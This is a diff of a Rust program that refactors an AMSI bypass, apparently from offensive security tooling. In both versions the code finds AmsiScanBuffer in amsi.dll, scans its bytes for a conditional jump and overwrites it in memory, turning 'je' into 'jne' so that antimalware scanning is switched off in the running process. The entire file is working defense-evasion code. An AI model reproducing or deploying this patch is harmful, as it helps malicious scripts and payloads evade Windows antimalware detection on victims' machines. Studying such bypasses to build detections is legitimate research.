@@ -1,79 +1,66 @@
-use std::ffi::{c_void, CString};
-use windows::core::{s, PCSTR};
-use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
-use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};
+use std::ffi::c_void;
+use std::ptr::null_mut;
+use std::slice::from_raw_parts;
+use windows::core::{s, Error, Result, PCSTR};
+use windows::Win32::System::LibraryLoader::{
+    GetProcAddress, LoadLibraryA
+};
+use windows::Win32::System::Memory::{
+    VirtualProtect, PAGE_EXECUTE_READWRITE, 
+    PAGE_PROTECTION_FLAGS
+};
 
-fn main() {
-    let amsi_buffer: *const u8 = CString::new("AmsiScanBuffer").unwrap().into_raw() as _;
-    disable_amsi(amsi_buffer);
-}
-
-fn disable_amsi(function: *const u8) {
+fn main() -> Result<()> {
+    let name = c"AmsiScanBuffer";
     unsafe {
-        let hook: [u8; 1] = [0x75];
-        let h_module = LoadLibraryA(s!("AMSI")).unwrap();
-        let address = GetProcAddress(h_module, PCSTR(function)).expect("[!] GetProcAddress Failed");
-        let address_ptr = address as *mut c_void;
-        let mut count = 0;
-        loop {
-            let opcode_c3 = *(address_ptr as *const u8).add(count);
-            let opcode_cc = *(address_ptr as *const u8).add(count + 1);
-            let opcode_cc_2 = *(address_ptr as *const u8).add(count + 2);
-            if opcode_c3 == 0xC3 && opcode_cc == 0xCC && opcode_cc_2 == 0xCC {
-                break;
+        // Opcode that will be injected (0x75 -> 'jne')
+        let patch_opcode = 0x75u8;
+        
+        // Load the AMSI.dll library
+        let h_module = LoadLibraryA(s!("AMSI"))?;
+
+        // Retrieve the address of the AmsiScanBuffer function
+        let address = GetProcAddress(h_module, PCSTR(name.as_ptr().cast()))
+            .ok_or_else(|| Error::from_win32())? as *const u8;
+
+        // Pattern to search for: ret + int3 + int3
+        let pattern = [0xC3, 0xCC, 0xCC];
+        let mut p_patch_address = null_mut();
+        let bytes = from_raw_parts(address as *const u8, 0x1000 as usize);
+        
+        // Search for the pattern within the buffer
+        if let Some(x) = bytes.windows(pattern.len()).position(|window| window == pattern) {
+            // Reverse scan to find the conditional jump instruction ('je')
+            for i in (0..x).rev() {
+                if bytes[i] == 0x74 {
+                    let offset = bytes.get(i + 1).copied().unwrap_or(0);
+                    let target_index = i.wrapping_add(2).wrapping_add(offset as usize);
+
+                    // Confirm that the jump leads to a 'mov eax, imm32' instruction
+                    if bytes.get(target_index) == Some(&0xB8) {
+                        p_patch_address = (address.add(i)) as *mut c_void;
+                        break;
+                    }
+                }
             }
-            count += 1;
         }
 
-        loop {
-            let offset_ptr = address_ptr.add(count) as *const u8;
-            if is_patchable(offset_ptr) {
-
-                let mut old_protection = PAGE_PROTECTION_FLAGS(0);
-                VirtualProtect(
-                    offset_ptr as *mut c_void,
-                    hook.len(),
-                    PAGE_EXECUTE_READWRITE,
-                    &mut old_protection,
-                ).unwrap_or_else(|e| {
-                    panic!("[!] VirtualProtect Failed With Error: {e}");
-                });
-
-                std::ptr::copy_nonoverlapping(
-                    hook.as_ptr(),
-                    offset_ptr as _,
-                    hook.len(),
-                );
-
-                VirtualProtect(
-                    offset_ptr as *mut c_void,
-                    hook.len(),
-                    old_protection,
-                    &mut old_protection,
-                ).unwrap_or_else(|e| {
-                    panic!("[!] VirtualProtect Failed With Error: {e}");
-                });
-
-                println!("[+] Patch AMSI Finish!");
-
-                break;
-            }
-            count -= 1;
+        if p_patch_address.is_null() {
+            return Err(Error::from_win32());
         }
+
+        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
+
+        // Change memory protection to allow writing
+        VirtualProtect(p_patch_address, 1, PAGE_EXECUTE_READWRITE, &mut old_protect)?;
+        
+        // Write the patch opcode ('jne')
+        *(p_patch_address as *mut u8) = patch_opcode;
+
+        // Restore the original memory protection
+        VirtualProtect(p_patch_address, 1, old_protect, &mut old_protect)?;
     }
+
+    Ok(())
 }
 
-fn is_patchable(address: *const u8) -> bool{
-    unsafe {
-        let opcode = *(address as *const u8);
-        if opcode != 0x74 {
-            return false
-        }
-        let new_address = *(address.add(std::mem::size_of::<u8>()));
-        let mov_address = address.add(std::mem::size_of::<u8>() * 2).add(new_address as usize);
-        if *mov_address == 0xB8 {
-            return true
-        }
-    }    
-    false
-}
